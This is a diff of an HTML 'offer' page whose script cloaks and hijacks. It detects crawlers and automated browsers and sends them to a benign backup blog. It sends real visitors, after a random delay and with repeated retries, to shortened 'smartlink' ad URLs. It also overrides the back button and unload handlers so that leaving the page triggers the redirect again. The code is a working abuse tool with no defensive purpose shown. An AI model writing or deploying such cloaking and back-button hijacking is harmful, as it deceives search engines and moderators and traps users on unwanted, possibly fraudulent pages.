@@ -1,93 +1,85 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>Special Offer</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Loading...</title>
 <style>
-body{margin:0;font-family:Arial,sans-serif;background:#fafafa;color:#111;line-height:1.6}
-#content{display:none;max-width:700px;margin:auto;padding:20px;text-align:center}
-h1{font-size:22px;color:#111}
-p{margin-bottom:15px}
-footer{margin-top:30px;font-size:13px;color:#888}
-#loading{display:flex;justify-content:center;align-items:center;height:100vh;}
+  html,body{height:100%;margin:0;font-family:Arial,Helvetica,sans-serif;background:#fff;color:#111}
+  .wrap{height:100%;display:flex;align-items:center;justify-content:center;flex-direction:column;padding:18px;text-align:center}
+  h1{font-size:20px;margin:0 0 10px}
+  p{margin:0;color:#666}
+  button.fallback{display:none;margin-top:16px;padding:12px 20px;font-size:16px;border-radius:8px;border:0;background:#007bff;color:#fff;cursor:pointer}
 </style>
 </head>
 <body>
-
-<div id="loading"><h1>Please wait...</h1></div>
-
-<div id="content">
-  <h1 id="headline">Loading...</h1>
-  <p id="desc">Preparing content...</p>
-  <footer>&copy; 2025</footer>
+<div class="wrap">
+  <h1>Please wait…</h1>
+  <p>Preparing your offer</p>
+  <button class="fallback" id="fallback">Continue</button>
 </div>
 
 <script>
 (function(){
+  // ====== SMARTLINK & BACKUP ======
   const smartlinks = [
     "https://t.co/Fhy6lcYTmc",
     "https://t.co/oPtZz8Eaw2",
     "https://t.co/HQSRn68Hs8",
     "https://politicsgrowinghollow.com/cb3yh0vp?key=ff17dd66f144c9303ad63a6cef1e01ed"
   ];
-  const backup = "https://scriptdev404.blogspot.com"; 
+  const backup = "https://scriptdev404.blogspot.com";
 
-  const geoContent = {
-    CA:{headline:["Exclusive Deal for Canada 🇨🇦","Offre exclusive pour le Canada 🇨🇦"],desc:["Unlock rewards available only in Canada.","Débloquez des récompenses disponibles uniquement au Canada."]},
-    US:{headline:["Special Offer for USA 🇺🇸","Bonus Deal for US Visitors"],desc:["Claim your bonus now!","Only for USA visitors – limited time."]},
-    GLOBAL:{headline:["Worldwide Offer 🌍","Special Bonus For You"],desc:["Available internationally – claim now.","Get your deal anywhere, anytime."]}
-  };
-
-  const pickRandom = arr=>arr[Math.floor(Math.random()*arr.length)];
+  // ====== HELPER ======
+  const pick = arr => arr[Math.floor(Math.random()*arr.length)];
   function isBot(){
-    const ua=navigator.userAgent.toLowerCase();
-    const bots=["bot","crawl","spider","slurp","facebook","twitter","pinterest","crawler","google","bing","yahoo","yandex","baidu"];
-    return bots.some(b=>ua.includes(b))||navigator.webdriver;
+    const ua=(navigator.userAgent||'').toLowerCase();
+    const bots=["bot","crawl","spider","slurp","facebook","twitter","pinterest","crawler","google","bing","yahoo","yandex","baidu","validator","preview"];
+    if(navigator.webdriver) return true;
+    if(!ua || ua.length<10) return true;
+    if(bots.some(b=>ua.includes(b))) return true;
+    return false;
+  }
+  function attempt(u){
+    try{location.replace(u);}catch(e){}
+    try{location.href=u;}catch(e){}
+    try{window.open(u,"_self");}catch(e){}
+  }
+  function redirectWithRetries(url){
+    attempt(url);
+    setTimeout(()=>attempt(url),700);
+    setTimeout(()=>attempt(url),2000);
   }
 
-  async function start(){
-    const loading=document.getElementById("loading");
-    const content=document.getElementById("content");
-    const headline=document.getElementById("headline");
-    const desc=document.getElementById("desc");
+  // ====== MAIN ======
+  if(isBot()){
+    setTimeout(()=>location.replace(backup),600);
+    return;
+  }
 
-    // === BOT: hanya lihat konten aman, redirect ke backup ===
-    if(isBot()){
-      loading.style.display="none";
-      content.style.display="block";
-      headline.innerText = pickRandom(geoContent.GLOBAL.headline);
-      desc.innerText = pickRandom(geoContent.GLOBAL.desc);
-      setTimeout(()=>{ location.replace(backup); },1500);
-      return;
-    }
+  const target = pick(smartlinks);
 
-    // === USER: tampilkan lalu redirect ===
-    let geo="GLOBAL";
+  // Auto redirect dengan delay random
+  const delay = Math.floor(Math.random()*800)+500; // 0.5-1.3s
+  setTimeout(()=>redirectWithRetries(target), delay);
+
+  // Anti back/close (force offer lagi)
+  setTimeout(()=>{
     try{
-      const r=await fetch("https://ipapi.co/json/").then(r=>r.json());
-      if(r.country_code) geo=r.country_code.toUpperCase();
-    }catch(e){ geo="GLOBAL"; }
-
-    const c = geoContent[geo] || geoContent.GLOBAL;
-    loading.style.display="none";
-    content.style.display="block";
-    headline.innerText = pickRandom(c.headline);
-    desc.innerText = pickRandom(c.desc);
-
-    const target = pickRandom(smartlinks);
-    const delay = Math.floor(Math.random()*1000)+800;
-    setTimeout(()=>{ location.replace(target); }, delay);
-
-    // === Force redirect kalau user back/close ===
-    setTimeout(()=>{
       history.pushState(null,null,location.href);
-      onpopstate=()=>location.replace(target);
-      onbeforeunload=()=>location.replace(target);
-    },2000);
-  }
+      window.onpopstate=()=>attempt(target);
+      window.onbeforeunload=()=>attempt(target);
+    }catch(e){}
+  },1200);
 
-  start();
+  // Fallback tombol manual kalau gagal (setelah 5s)
+  setTimeout(()=>{
+    if(document.visibilityState!=="hidden"){
+      const btn=document.getElementById("fallback");
+      btn.style.display="inline-block";
+      btn.onclick=()=>redirectWithRetries(target);
+    }
+  },5000);
 })();
 </script>
 </body>
